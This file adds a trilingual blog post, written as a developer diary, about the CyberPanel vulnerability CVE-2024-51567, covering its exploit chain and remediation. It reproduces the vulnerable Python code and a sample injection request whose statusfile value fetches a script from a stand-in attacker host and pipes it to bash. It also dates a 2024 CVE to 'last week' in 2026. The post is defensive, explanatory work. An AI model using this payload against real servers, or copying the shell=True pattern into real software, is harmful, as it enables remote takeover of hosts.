@@ -1,0 +1,819 @@
+---
+import Layout from '../../layouts/Layout.astro';
+import Nav from '../../components/Nav.astro';
+import { useTranslations } from '../../i18n/utils';
+import Animations from '../../components/Animations.vue';
+import CommentsSection from '../../components/CommentsSection.vue';
+import BlogNavigation from '../../components/BlogNavigation.astro';
+
+export function getStaticPaths() {
+  return [
+    { params: { lang: 'en' } },
+    { params: { lang: 'es' } },
+    { params: { lang: 'pt' } },
+  ];
+}
+
+const { lang } = Astro.params;
+const t = useTranslations(lang as any);
+
+const content = {
+  en: {
+    title: "Dear Diary, The CyberPanel Disaster (CVE-2024-51567): Massive Python RCE, Command Injection, and Compromised VPS Servers 🌸",
+    date: "October 29, 2026",
+    subtitle: "A developer diary entry by Jill",
+    back: 'Back to Home',
+    intro: "What happens when a popular web hosting panel built on Python and Django runs its web service as root, filters HTTP methods incorrectly in its authentication middleware, and feeds unsanitized user input into a shell command?",
+    introDesc: "Over 22,000 servers worldwide found out the hard way last week. CVE-2024-51567 enabled unauthenticated remote code execution as root, triggering a massive wave of PSAUX ransomware encrypting WordPress sites and databases. In this entry I took the time to dissect and break down the technical flaw, how the exploit chain functions, how to remediate it, and the architecture lessons it leaves us.",
+    bannerLabel: "National Vulnerability Database & Security Advisory:",
+    bannerUrl: "https://nvd.nist.gov/vuln/detail/CVE-2024-51567",
+    sections: [
+      {
+        heading: "1. What Happened: The Chaos With Hijacked VPS Servers",
+        paragraphs: [
+          "If you manage <a href={`/${lang}/blog-droplets-vps/`} class=\"inline-blog-link\">cloud droplets or VPS servers</a> for clients or WordPress sites, chances are high you've heard of or used **CyberPanel**. Powered by OpenLiteSpeed and written in Python with Django, it has become one of the go-to open-source hosting control panels for developers seeking high performance without expensive cPanel licenses.",
+          "To be honest, although I don't currently have an active tool or production project built with Python, when I heard about this incident I made sure to take the time to investigate and learn exactly what happened. Seeing how web control panels, HTTP verbs, and backend services interact is fundamental for anyone managing infrastructure.",
+          "Last week, the hosting community woke up to an absolute nightmare. System administrators across Hetzner, DigitalOcean, Linode, and Contabo reported thousands of VPS instances locked, with database tables scrambled and ransom notes left by the **PSAUX ransomware** gang.",
+          "The culprit was **CVE-2024-51567**, a critical unauthenticated Remote Code Execution (RCE) vulnerability scored at CVSS 9.8. Within hours of public disclosure by security researcher DreyAnd, automated internet scanners weaponized the vulnerability at industrial scale."
+        ]
+      },
+      {
+        heading: "2. The Flaw Part 1: Authentication Bypass via HTTP Method Manipulation",
+        paragraphs: [
+          "Every web framework security guide emphasizes: **never assume the HTTP verb alone determines security boundaries**.",
+          "In CyberPanel, an internal security middleware named `secMiddleware` was tasked with guarding sensitive control endpoints like `/dataBases/upgrademysqlstatus`. However, the middleware contained a fatal architectural assumption: it specifically filtered requests where `request.method == 'POST'`.",
+          "Because Django's router handles other HTTP methods (or allows requests without strict verb gating unless explicitly enforced with `@require_http_methods`), an attacker could send a `PUT` or `OPTIONS` request. The authentication middleware looked at the request, saw it wasn't a standard POST that required its token check, and let it pass straight through to the internal view function!"
+        ],
+        codeLabel: "The Vulnerable secMiddleware Logic vs. The Fix",
+        code: `# Inside vulnerable secMiddleware (CyberPanel < v2.3.6):
+# The middleware checked if the request was POST before validating auth:
+if request.method == 'POST':
+    if not self.validate_session_or_token(request):
+        return JsonResponse({'status': 0, 'error': 'Unauthorized'}, status=401)
+# BUG: If the attacker sends HTTP PUT or PATCH, execution falls through!
+# The endpoint receives the payload completely unauthenticated.
+
+# ── The Security Fix:
+# Invert logic: Deny by default, enforce strict decorators on the Django view:
+from django.views.decorators.http import require_POST
+from django.contrib.auth.decorators import login_required
+
+@require_POST
+@login_required
+def upgrademysqlstatus(request):
+    ...`
+      },
+      {
+        heading: "3. The Flaw Part 2: Root Command Injection via `subprocess`",
+        paragraphs: [
+          "Bypassing authentication is bad enough, but what made CVE-2024-51567 lethal was what waited behind the unprotected endpoint.",
+          "In the `upgrademysqlstatus` view function inside `databases/views.py`, CyberPanel accepted a parameter called `statusfile` from the request payload. Instead of treating this parameter as a safe file name or validating it against an allowlist, the code concatenated it directly into a bash command string executed via `subprocess.Popen` or shell commands.",
+          "Even worse: because CyberPanel manages system packages, web servers, and firewall rules, its background worker processes run with **full `root` privileges** on the operating system. Injecting shell metacharacters meant instantaneous root-level shell access."
+        ],
+        codeLabel: "Vulnerable statusfile Handler in databases/views.py",
+        code: `# Inside databases/views.py in CyberPanel:
+def upgrademysqlstatus(request):
+    try:
+        data = json.loads(request.body)
+        statusfile = data.get('statusfile')
+        
+        # FATAL FLAW: statusfile is directly interpolated into a shell string!
+        # An attacker sends: "statusfile": "/dev/null; id; curl http://c2.evil/payload | sh; #"
+        cmd = f"cat {statusfile}"
+        
+        # Executed directly with shell=True under root!
+        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, _ = process.communicate()
+        return JsonResponse({'status': 1, 'result': output.decode()})
+    except Exception as e:
+        return JsonResponse({'status': 0, 'error': str(e)})`
+      },
+      {
+        heading: "4. The Weaponization: How PSAUX Ransomware Locked Servers",
+        paragraphs: [
+          "Once the vulnerability was public, threat actors didn't waste a single minute. Port 8090 (CyberPanel's default management port) was scanned across all global IPv4 address ranges.",
+          "Automated Python exploit bots fired two-line HTTP requests targeting `/dataBases/upgrademysqlstatus`. The attack was orchestrated by the <a href={`/${lang}/blog-psaux-ransomware/`} class=\"inline-blog-link\">PSAUX ransomware gang</a>, downloading a payload script that:",
+          "1. Stopped database and web services (`systemctl stop mysqld openlitespeed`).",
+          "2. Used symmetric encryption (AES / ChaCha20) to encrypt all files in `/home/*/public_html/` and database files in `/var/lib/mysql/`.",
+          "3. Appended the `.psaux` extension and dropped a `README_LOCKED.txt` demanding ransom payments.",
+          "This widespread exploitation reminded me of the scramble during the <a href={`/${lang}/blog-php-cve-exploit/`} class=\"inline-blog-link\">PHP RCE vulnerability (CVE-2026-109618) and the Forge downtime</a>, but running directly as root amplified the destruction: backups stored on local volumes or default `/backup` partitions were encrypted as well."
+        ],
+        codeLabel: "The Typical Exploit Payload Structure Observed in the Wild",
+        code: `# HTTP Request sent by automated scanning bots:
+PUT /dataBases/upgrademysqlstatus HTTP/1.1
+Host: target-vps.com:8090
+Content-Type: application/json
+Content-Length: 128
+
+{
+  "statusfile": "/dev/null; curl -s http://attacker-ip/stage1.sh | bash; #"
+}`
+      },
+      {
+        heading: "5. Immediate Remediation & Hardening Steps",
+        paragraphs: [
+          "If you or your team run CyberPanel on any server, immediate action is required:",
+          "**1. Run the Official Upgrade Script:** CyberPanel pushed security patches in version 2.3.6 and 2.3.7. Execute the upgrade script from an SSH terminal to pull the patched codebase.",
+          "**2. Firewall Port 8090 Immediately:** Never leave web panel management ports open to `0.0.0.0/0`. Restrict port 8090 to your specific administrative static IP or access it solely via a private VPN / Tailscale tunnel.",
+          "**3. Check for Indicators of Compromise (IoC):** Inspect `/var/log/cyberpanel/` for abnormal requests to `upgrademysqlstatus`, and verify whether unexpected cron jobs exist in `/etc/cron*` or `/var/spool/cron/crontabs/`."
+        ],
+        codeLabel: "Upgrading CyberPanel and Restricting Firewall Access",
+        code: `# 1. Upgrade CyberPanel to the latest patched version:
+sh <(curl https://raw.githubusercontent.com/usmanalinasir/cyberpanel/stable/preUpgrade.sh || wget -O - https://raw.githubusercontent.com/usmanalinasir/cyberpanel/stable/preUpgrade.sh)
+
+# 2. Block public access to port 8090 using UFW (Ubuntu/Debian):
+ufw default deny incoming
+ufw allow 22/tcp
+ufw allow 80/tcp
+ufw allow 443/tcp
+# Allow port 8090 ONLY from your trusted IP:
+ufw allow from YOUR_OFFICE_IP to any port 8090 proto tcp
+ufw reload
+
+# 3. Check for anomalous background processes or lock files:
+find /home -name "*README_LOCKED*" -o -name "*.psaux" 2>/dev/null`
+      },
+      {
+        heading: "6. Architecture Lessons for Full-Stack & Python Developers",
+        paragraphs: [
+          "Beyond emergency patches, this disaster holds fundamental lessons for all of us writing backend software:",
+          "**• Never use `shell=True` with user input:** If you need to execute external commands in Python, pass arguments as a list (`['cat', filename]`) and sanitize inputs with `os.path.basename` or `pathlib.Path`. Python subprocess lists do not invoke a subshell, preventing metacharacter command execution.",
+          "**• Fail closed in security middleware:** Security middleware should never ask 'is this a method I should check?'. It must ask 'is this route explicitly public? If not, reject all unauthenticated requests regardless of verb.'",
+          "**• Drop privileges early:** Running a web control server directly as `root` violates the principle of least privilege. Decoupling the user-facing web API (running as an unprivileged user) from a strictly audited local Unix socket daemon with restricted sudo capabilities would have contained this exploit completely."
+        ]
+      }
+    ],
+    remember: {
+      heading: "Things I Want To Remember 🌸",
+      items: [
+        "**Never trust HTTP verbs for authentication:** An authentication gate that only verifies `POST` is an open door for `PUT`, `PATCH`, or `OPTIONS` requests.",
+        "**`shell=True` in Python is a ticking time bomb:** Always use list-based arguments with `subprocess.Popen(['command', 'arg1'])` without invoking shell interpreters.",
+        "**Management ports must never be public:** Exposing ports like `8090`, `8443`, or `10000` to the entire internet invites automated mass scanners. Use VPNs or IP allowlists.",
+        "**Separation of privileges matters:** Running a full web application with `root` privileges turns a single sanitization bug into complete server takeover.",
+        "**Local backups are not disaster recovery:** If your backup partition is mounted and accessible by root, ransomware will encrypt your backups along with your production data."
+      ]
+    },
+    closingHeading: "Closing Thoughts",
+    closingText: "Security vulnerabilities in our infrastructure tools hit differently because we trust them to protect our servers. Seeing thousands of production sites go down in a weekend is a sobering reminder that clean code and defensive architecture aren't academic—they are our defense against real-world chaos.",
+    closing: "Stay alert, keep your servers patched, and never leave your management ports open to the world!",
+    closingSign: "With determination and caffeine,",
+    signature: "Jill 🌸"
+  },
+  es: {
+    title: "Querido Diario, El Desastre de CyberPanel (CVE-2024-51567): RCE Masivo en Python y Servidores Secuestrados 🌸",
+    date: "29 de octubre de 2026",
+    subtitle: "Una entrada en el diario de desarrollo de Jill",
+    back: 'Volver al Inicio',
+    intro: "¿Qué sucede cuando un popular panel de hosting web construido con Python y Django corre su servicio web como root, filtra de forma incorrecta los métodos HTTP en su middleware de autenticación y pasa parámetros de usuario sin sanitizar a comandos de shell?",
+    introDesc: "Más de 22,000 servidores en todo el mundo lo descubrieron por las malas la semana pasada. La vulnerabilidad CVE-2024-51567 permitió ejecución remota de código (RCE) como root sin autenticación, desatando una oleada de ransomware PSAUX que cifró sitios WordPress y bases de datos completas. En esta entrada me puse a desmenuzar técnicamente el fallo, cómo funciona la cadena de exploit, cómo parcharlo y qué lecciones nos deja a los desarrolladores Full-Stack.",
+    bannerLabel: "Aviso de Seguridad en National Vulnerability Database:",
+    bannerUrl: "https://nvd.nist.gov/vuln/detail/CVE-2024-51567",
+    sections: [
+      {
+        heading: "1. Lo que pasó: El caos con los servidores secuestrados",
+        paragraphs: [
+          "Si administras <a href={`/${lang}/blog-droplets-vps/`} class=\"inline-blog-link\">droplets en la nube o servidores VPS</a> para tus clientes o sitios de WordPress, es muy probable que conozcas o utilices **CyberPanel**. Impulsado por OpenLiteSpeed y escrito en Python con Django, se convirtió en uno de los paneles de control de código abierto más populares para quienes buscan rendimiento sin pagar licencias de cPanel.",
+          "Para ser sincera, aunque actualmente no tengo alguna herramienta activa o proyecto en producción construido con Python, cuando me enteré de este incidente me tomé el tiempo necesario para investigar a fondo y aprender. Ver cómo se conectan los paneles de control web, los métodos HTTP y el backend es algo fundamental para cualquiera que administre infraestructura.",
+          "La semana pasada, la comunidad de sysadmins y desarrolladores se despertó en una auténtica pesadilla. Administradores de sistemas en Hetzner, DigitalOcean, Linode y Contabo reportaron miles de servidores VPS bloqueados, con bases de datos dañadas y notas de rescate dejadas por el grupo de ransomware **PSAUX**.",
+          "El causante fue **CVE-2024-51567**, una falla crítica de ejecución remota de código no autenticada con puntaje CVSS de 9.8. Horas después de su publicación por el investigador DreyAnd, scripts automatizados comenzaron a escanear todo internet para explotarla masivamente."
+        ]
+      },
+      {
+        heading: "2. La Falla Parte 1: Bypass de Autenticación por Manipulación de Métodos HTTP",
+        paragraphs: [
+          "Cualquier guía de seguridad en desarrollo web repite lo mismo: **nunca asumas que el verbo HTTP por sí solo determina las reglas de seguridad**.",
+          "En CyberPanel, un middleware interno llamado `secMiddleware` tenía la tarea de proteger rutas sensibles como `/dataBases/upgrademysqlstatus`. Sin embargo, el middleware contenía un error conceptual fatal: verificaba específicamente si `request.method == 'POST'`.",
+          "Como el enrutador de Django acepta otros métodos HTTP (o permite peticiones sin restricción de verbo a menos que se use explícitamente `@require_http_methods`), un atacante podía enviar una solicitud `PUT` u `OPTIONS`. El middleware de autenticación revisaba la solicitud, veía que no era un POST estándar que requiriera su token, ¡y la dejaba pasar directamente a la función de vista interna sin autenticar!"
+        ],
+        codeLabel: "La Lógica Vulnerable en secMiddleware vs. La Solución",
+        code: `# Dentro del secMiddleware vulnerable (CyberPanel < v2.3.6):
+# El middleware verificaba si la solicitud era POST antes de validar autenticación:
+if request.method == 'POST':
+    if not self.validate_session_or_token(request):
+        return JsonResponse({'status': 0, 'error': 'Unauthorized'}, status=401)
+# ¡ERROR! Si el atacante envía HTTP PUT o PATCH, la ejecución continúa.
+# El endpoint recibe la carga sin requerir credenciales ni sesión activa.
+
+# ── La Corrección de Seguridad:
+# Bloquear por defecto y exigir decoradores estrictos en la vista de Django:
+from django.views.decorators.http import require_POST
+from django.contrib.auth.decorators import login_required
+
+@require_POST
+@login_required
+def upgrademysqlstatus(request):
+    ...`
+      },
+      {
+        heading: "3. La Falla Parte 2: Inyección de Comandos Root vía `subprocess`",
+        paragraphs: [
+          "Bypasear la autenticación ya es gravísimo, pero lo que hizo a CVE-2024-51567 letal fue lo que esperaba dentro del endpoint desprotegido.",
+          "En la función `upgrademysqlstatus` dentro de `databases/views.py`, CyberPanel leía un parámetro llamado `statusfile` proveniente del cuerpo JSON de la petición. En lugar de validar que fuera una ruta legítima o compararlo contra una lista blanca, el código concatenaba ese parámetro directamente en una cadena de comando bash ejecutada mediante `subprocess.Popen`.",
+          "Y lo peor de todo: como CyberPanel gestiona paquetes del sistema operativo, servicios web y cortafuegos, sus procesos corren con **privilegios de `root`**. Inyectar caracteres de control de shell como `;` o `&&` otorgaba acceso root inmediato e irrestricto a todo el VPS."
+        ],
+        codeLabel: "Manejador Vulnerable de statusfile en databases/views.py",
+        code: `# Dentro de databases/views.py en CyberPanel:
+def upgrademysqlstatus(request):
+    try:
+        data = json.loads(request.body)
+        statusfile = data.get('statusfile')
+        
+        # ERROR FATAL: statusfile se interpola directamente en un comando shell:
+        # El atacante envía: "statusfile": "/dev/null; id; curl http://c2.evil/malware.sh | sh; #"
+        cmd = f"cat {statusfile}"
+        
+        # ¡Se ejecuta directamente con shell=True como root!
+        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, _ = process.communicate()
+        return JsonResponse({'status': 1, 'result': output.decode()})
+    except Exception as e:
+        return JsonResponse({'status': 0, 'error': str(e)})`
+      },
+      {
+        heading: "4. La Explotación Real: El Ransomware PSAUX Secuestrando Servidores",
+        paragraphs: [
+          "Una vez que el exploit se hizo público, los actores de amenazas no perdieron ni un segundo. El puerto 8090 (puerto por defecto de CyberPanel) fue escaneado de forma masiva en rangos IPv4 globales.",
+          "El ataque fue orquestado por el grupo del <a href={`/${lang}/blog-psaux-ransomware/`} class=\"inline-blog-link\">ransomware PSAUX</a>. Bots automatizados en Python disparaban peticiones HTTP dirigidas a `/dataBases/upgrademysqlstatus`. El payload inyectado descargaba un script que:",
+          "1. Detenía los servicios de bases de datos y web (`systemctl stop mysqld openlitespeed`).",
+          "2. Cifraba con AES/ChaCha20 todos los archivos web en `/home/*/public_html/` y las bases de datos en `/var/lib/mysql/`.",
+          "3. Renombraba los archivos con la extensión `.psaux` y dejaba notas de rescate `README_LOCKED.txt` exigiendo pagos en Bitcoin.",
+          "Este tipo de ataques masivos me recordó mucho al caos que analicé con la <a href={`/${lang}/blog-php-cve-exploit/`} class=\"inline-blog-link\">vulnerabilidad crítica en PHP (CVE-2026-109618) y la caída en Forge</a>, pero aquí el impacto fue aún más devastador: al correr directamente como `root`, las copias de seguridad locales y las particiones `/backup` montadas en el mismo servidor también fueron cifradas sin piedad."
+        ],
+        codeLabel: "Estructura del Payload Observado en Servidores Vulnerables",
+        code: `# Petición HTTP enviada por bots de escaneo automatizado:
+PUT /dataBases/upgrademysqlstatus HTTP/1.1
+Host: tu-servidor-vps.com:8090
+Content-Type: application/json
+Content-Length: 128
+
+{
+  "statusfile": "/dev/null; curl -s http://attacker-ip/stage1.sh | bash; #"
+}`
+      },
+      {
+        heading: "5. Mitigación Inmediata y Pasos de Fortalecimiento",
+        paragraphs: [
+          "Si tú o tu equipo administran CyberPanel en algún servidor, deben tomar acción inmediata:",
+          "**1. Ejecutar el Script Oficial de Actualización:** CyberPanel publicó parches de emergencia en la versión 2.3.6 y 2.3.7. Ejecuta el script de actualización desde SSH para obtener el código corregido.",
+          "**2. Cerrar el Puerto 8090 en el Firewall:** Nunca dejes puertos de paneles de control expuestos a todo internet (`0.0.0.0/0`). Limita el puerto 8090 a tu IP administrativa o accede únicamente mediante VPN privada (como Tailscale o WireGuard).",
+          "**3. Buscar Indicadores de Compromiso (IoC):** Revisa `/var/log/cyberpanel/` en busca de peticiones sospechosas a `upgrademysqlstatus`, y verifica si se crearon tareas cron desconocidas en `/etc/cron*` o `/var/spool/cron/crontabs/`."
+        ],
+        codeLabel: "Actualizando CyberPanel y Configurando Reglas de Firewall",
+        code: `# 1. Actualizar CyberPanel a la versión corregida:
+sh <(curl https://raw.githubusercontent.com/usmanalinasir/cyberpanel/stable/preUpgrade.sh || wget -O - https://raw.githubusercontent.com/usmanalinasir/cyberpanel/stable/preUpgrade.sh)
+
+# 2. Bloquear acceso público al puerto 8090 con UFW (Ubuntu/Debian):
+ufw default deny incoming
+ufw allow 22/tcp
+ufw allow 80/tcp
+ufw allow 443/tcp
+# Permitir el puerto 8090 ÚNICAMENTE desde tu IP fija de administración:
+ufw allow from TU_IP_ADMIN to any port 8090 proto tcp
+ufw reload
+
+# 3. Verificar si existen archivos de secuestro en el servidor:
+find /home -name "*README_LOCKED*" -o -name "*.psaux" 2>/dev/null`
+      },
+      {
+        heading: "6. Lecciones de Arquitectura para Desarrolladores Full-Stack y Python",
+        paragraphs: [
+          "Más allá de parchar la emergencia, este desastre deja lecciones esenciales para cualquiera que construya software de backend:",
+          "**• Nunca uses `shell=True` con datos de usuario:** Si necesitas ejecutar herramientas externas en Python, pasa los argumentos en una lista (`['cat', filename]`) y valida con `pathlib.Path`. Las listas en subprocess no invocan un intérprete de shell y evitan la inyección de comandos.",
+          "**• Fallar seguro en los middlewares:** La seguridad nunca debe preguntarse '¿es este un método que debo revisar?'. Debe preguntarse '¿es esta ruta explícitamente pública? Si no lo es, rechaza cualquier petición no autenticada sin importar el verbo HTTP'.",
+          "**• Separación de privilegios:** Correr una aplicación web completa directamente como `root` viola el principio de mínimo privilegio. Separar la API web (corriendo bajo un usuario sin privilegios) de un demonio local auditado con permisos de sudo restringidos habría frenado este exploit por completo."
+        ]
+      }
+    ],
+    remember: {
+      heading: "Cosas que Quiero Recordar 🌸",
+      items: [
+        "**Nunca confíes en los verbos HTTP para autenticar:** Un filtro de seguridad que solo valida `POST` deja la puerta abierta de par en par a peticiones `PUT`, `PATCH` u `OPTIONS`.",
+        "**`shell=True` en Python es una bomba de tiempo:** Siempre pasa argumentos en listas estructuradas con `subprocess.Popen(['comando', 'arg1'])` sin llamar al shell de bash.",
+        "**Los puertos de administración jamás deben ser públicos:** Abrir puertos como `8090`, `8443` o `10000` a todo internet invita a bots automatizados. Usa VPNs o listas de IPs permitidas.",
+        "**La separación de privilegios salva servidores:** Correr una aplicación web entera con permisos de `root` convierte cualquier error de validación en la toma total del servidor.",
+        "**Las copias de seguridad locales no son recuperación de desastres:** Si tu partición de respaldo está montada y accesible por root, el ransomware la cifrará junto con tus datos de producción."
+      ]
+    },
+    closingHeading: "Reflexión Final",
+    closingText: "Las vulnerabilidades de seguridad en las herramientas de infraestructura se sienten diferentes porque confiamos en ellas para cuidar nuestros servidores. Ver miles de servidores de producción caer en cuestión de horas nos recuerda que las buenas prácticas de arquitectura y código limpio no son un lujo teórico: son la barrera contra el desastre.",
+    closing: "¡Mantén tus servidores actualizados, cierra los puertos innecesarios y programa siempre a la defensiva!",
+    closingSign: "Con determinación y mucho café,",
+    signature: "Jill 🌸"
+  },
+  pt: {
+    title: "Querido Diário, O Desastre do CyberPanel (CVE-2024-51567): RCE Massivo em Python e Servidores Sequestrados 🌸",
+    date: "29 de outubro de 2026",
+    subtitle: "Uma entrada no diário de desenvolvimento de Jill",
+    back: 'Voltar ao Início',
+    intro: "O que acontece quando um painel popular de hospedagem web feito em Python e Django executa seu serviço web como root, filtra incorretamente os métodos HTTP em seu middleware de autenticação e passa parâmetros de usuário sem sanitização diretamente para o shell?",
+    introDesc: "Mais de 22.000 servidores em todo o mundo descobriram da pior maneira na semana passada. A CVE-2024-51567 permitiu execução remota de código (RCE) como root sem autenticação, disparando uma onda massiva de ransomware PSAUX criptografando sites WordPress e bancos de dados. Nesta entrada decidi esmiuçar tecnicamente a falha, como funciona o exploit, como aplicar patches e as lições para desenvolvedores Full-Stack.",
+    bannerLabel: "Aviso de Segurança na National Vulnerability Database:",
+    bannerUrl: "https://nvd.nist.gov/vuln/detail/CVE-2024-51567",
+    sections: [
+      {
+        heading: "1. O que Aconteceu: O Caos dos Servidores Sequestrados",
+        paragraphs: [
+          "Se você administra <a href={`/${lang}/blog-droplets-vps/`} class=\"inline-blog-link\">droplets na nuvem ou servidores VPS</a> para clientes ou sites WordPress, provavelmente já ouviu falar ou usou o **CyberPanel**. Desenvolvido com OpenLiteSpeed, Python e Django, tornou-se uma das principais opções de painel de controle gratuito para quem busca alta performance sem pagar licenças caras de cPanel.",
+          "Para ser sincera, embora atualmente eu não tenha nenhuma ferramenta ativa ou projeto em produção feito em Python, quando soube deste incidente fiz questão de tirar um tempo para investigar a fundo e aprender. Entender como painéis de controle, verbos HTTP e serviços de backend interagem é indispensável para qualquer desenvolvedor.",
+          "Na semana passada, administradores de sistemas em provedores como Hetzner, DigitalOcean, Linode e Contabo acordaram em um pesadelo: milhares de servidores completamente bloqueados, com arquivos web e bancos de dados bloqueados pelo grupo de ransomware **PSAUX**.",
+          "A causa foi a **CVE-2024-51567**, uma vulnerabilidade crítica de RCE não autenticado com pontuação máxima de gravidade CVSS 9.8. Horas após sua publicação pelo pesquisador DreyAnd, bots automatizados escanearam a internet inteira para explorá-la em escala industrial."
+        ]
+      },
+      {
+        heading: "2. A Falha Parte 1: Bypass de Autenticação por Manipulação de Verbos HTTP",
+        paragraphs: [
+          "Toda boa prática de segurança ensina: **nunca confie que o método HTTP sozinho define seus limites de segurança**.",
+          "No CyberPanel, um middleware interno chamado `secMiddleware` tinha como função proteger endpoints críticos como `/dataBases/upgrademysqlstatus`. No entanto, havia um erro arquitetural grave: ele verificava explicitamente apenas se `request.method == 'POST'`.",
+          "Como o roteador do Django aceita outros métodos HTTP a menos que decorado com `@require_http_methods`, invasores enviaram requisições com o verbo `PUT` ou `OPTIONS`. O middleware olhava a requisição, concluía que não era um POST exigindo token, e deixava a execução passar livremente até a view interna!"
+        ],
+        codeLabel: "Lógica Vulnerável no secMiddleware vs. Correção",
+        code: `# Dentro do secMiddleware vulnerável (CyberPanel < v2.3.6):
+if request.method == 'POST':
+    if not self.validate_session_or_token(request):
+        return JsonResponse({'status': 0, 'error': 'Unauthorized'}, status=401)
+# FALHA: Se a requisição for HTTP PUT ou PATCH, passa direto!
+# O endpoint interno recebe a chamada sem nenhuma autenticação.
+
+# ── Correção de Segurança:
+# Bloquear por padrão e exigir decoradores na view do Django:
+from django.views.decorators.http import require_POST
+from django.contrib.auth.decorators import login_required
+
+@require_POST
+@login_required
+def upgrademysqlstatus(request):
+    ...`
+      },
+      {
+        heading: "3. A Falha Parte 2: Injeção de Comandos Root via `subprocess`",
+        paragraphs: [
+          "Burlar a autenticação já é terrível, mas o que tornou a CVE-2024-51567 fatal foi o que estava esperando dentro do endpoint.",
+          "Na função `upgrademysqlstatus` em `databases/views.py`, o CyberPanel recebia um parâmetro chamado `statusfile` do JSON da requisição. Em vez de validar se era um caminho de arquivo seguro, o código concatenava esse valor diretamente em uma string de comando bash executada com `subprocess.Popen`.",
+          "Para piorar: como o CyberPanel gerencia pacotes do sistema e serviços de rede, seus processos rodam com **privilégios de `root`**. A injeção de caracteres de comando concedia controle total e imediato de todo o servidor."
+        ],
+        codeLabel: "Código Vulnerável em databases/views.py",
+        code: `# Dentro de databases/views.py no CyberPanel:
+def upgrademysqlstatus(request):
+    try:
+        data = json.loads(request.body)
+        statusfile = data.get('statusfile')
+        
+        # ERRO FATAL: statusfile concatenado diretamente em comando shell:
+        cmd = f"cat {statusfile}"
+        
+        # Executado diretamente como root com shell=True!
+        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, _ = process.communicate()
+        return JsonResponse({'status': 1, 'result': output.decode()})
+    except Exception as e:
+        return JsonResponse({'status': 0, 'error': str(e)})`
+      },
+      {
+        heading: "4. A Ameaça Real: Como o Ransomware PSAUX Sequestrou os Servidores",
+        paragraphs: [
+          "Com o exploit público, grupos criminosos escanearam a porta 8090 em todo o espaço de endereçamento IPv4.",
+          "Bots automatizados enviaram requisições HTTP `PUT` para `/dataBases/upgrademysqlstatus` contendo scripts que paravam os bancos de dados, criptografavam `/home/*/public_html/` e `/var/lib/mysql/`, e renomeavam arquivos para `.psaux` exigindo resgates.",
+          "Como o comando rodava como root, backups armazenados em discos locais ou partições montadas foram igualmente criptografados."
+        ]
+      },
+      {
+        heading: "5. Remediação Imediata e Boas Práticas",
+        paragraphs: [
+          "Se você possui servidores com CyberPanel:",
+          "**1. Execute a atualização oficial:** O CyberPanel disponibilizou correções emergenciais na versão 2.3.6 e 2.3.7.",
+          "**2. Bloqueie a porta 8090 no Firewall:** Não deixe portas de painéis de gerenciamento expostas à internet pública. Limite o acesso apenas ao seu IP fixo ou utilize uma VPN segura (Tailscale / WireGuard).",
+          "**3. Verifique indicadores de invasão:** Monitore `/var/log/cyberpanel/` para requisições anômalas em `upgrademysqlstatus` e verifique tarefas no cron."
+        ],
+        codeLabel: "Atualização e Bloqueio de Firewall com UFW",
+        code: `# 1. Atualizar o CyberPanel para a versão corrigida:
+sh <(curl https://raw.githubusercontent.com/usmanalinasir/cyberpanel/stable/preUpgrade.sh || wget -O - https://raw.githubusercontent.com/usmanalinasir/cyberpanel/stable/preUpgrade.sh)
+
+# 2. Restringir acesso à porta 8090 com UFW:
+ufw default deny incoming
+ufw allow 22/tcp
+ufw allow 80/tcp
+ufw allow 443/tcp
+ufw allow from SEU_IP_ADMIN to any port 8090 proto tcp
+ufw reload`
+      },
+      {
+        heading: "6. Lições de Arquitetura para Desenvolvedores Full-Stack",
+        paragraphs: [
+          "**• Nunca utilize `shell=True` com dados de usuários:** Passe argumentos em listas com `subprocess.Popen(['cat', path])` para evitar a execução de subshells arbitrários.",
+          "**• Falhe de forma segura nos middlewares:** A autenticação deve barrar qualquer requisição não autorizada por padrão, sem confiar em verificações parciais de verbos HTTP.",
+          "**• Princípio do menor privilégio:** Aplicações web nunca devem ser executadas com usuário `root`. Isolar a API em processos sem privilégios teria contido o dano totalmente."
+        ]
+      }
+    ],
+    remember: {
+      heading: "Coisas que Quero Lembrar 🌸",
+      items: [
+        "**Nunca confie apenas em verbos HTTP:** Validar somente requisições `POST` deixa as portas abertas para `PUT` ou `OPTIONS` desprotegidos.",
+        "**`shell=True` no Python é um perigo constante:** Sempre forneça argumentos estruturados em listas para o `subprocess`.",
+        "**Portas administrativas nunca devem ser públicas:** Feche portas como `8090` e `8443` para a internet geral e utilize VPNs.",
+        "**Separação de privilégios é essencial:** Rodar servidores web diretamente como `root` amplia qualquer vulnerabilidade para o comprometimento total da máquina.",
+        "**Backups locais não salvam desastres:** Se o ransomware tiver acesso root, ele criptografará o backup junto com a aplicação principal."
+      ]
+    },
+    closingHeading: "Reflexão Final",
+    closingText: "Vulnerabilidades em ferramentas de infraestrutura nos lembram que a arquitetura defensiva não é capricho: é o que protege o trabalho de equipes inteiras da destruição.",
+    closing: "Mantenha seus servidores protegidos e programe sempre com segurança em mente!",
+    closingSign: "Com foco e determinação,",
+    signature: "Jill 🌸"
+  }
+};
+
+const c = content[lang as keyof typeof content] || content.en;
+---
+
+<Layout title={c.title} lang={lang}>
+  <Nav activeSection="blog" lang={lang} />
+  <div class="blog-post-page">
+    <main class="container">
+      <a href={`/${lang}/`} class="back-link">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="19" y1="12" x2="5" y2="12"></line>
+          <polyline points="12 19 5 12 12 5"></polyline>
+        </svg>
+        <span>{c.back}</span>
+      </a>
+
+      <article class="post-article">
+        <header class="post-header">
+          <div class="meta-badge">
+            <span class="badge-icon">🛡️</span>
+            <span>CVE-2024-51567 • Security Audit</span>
+          </div>
+          <h1 class="post-title">{c.title}</h1>
+          <p class="post-subtitle">{c.subtitle}</p>
+          <time class="post-date">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+              <line x1="16" y1="2" x2="16" y2="6"></line>
+              <line x1="8" y1="2" x2="8" y2="6"></line>
+              <line x1="3" y1="10" x2="21" y2="10"></line>
+            </svg>
+            <span>{c.date}</span>
+          </time>
+        </header>
+
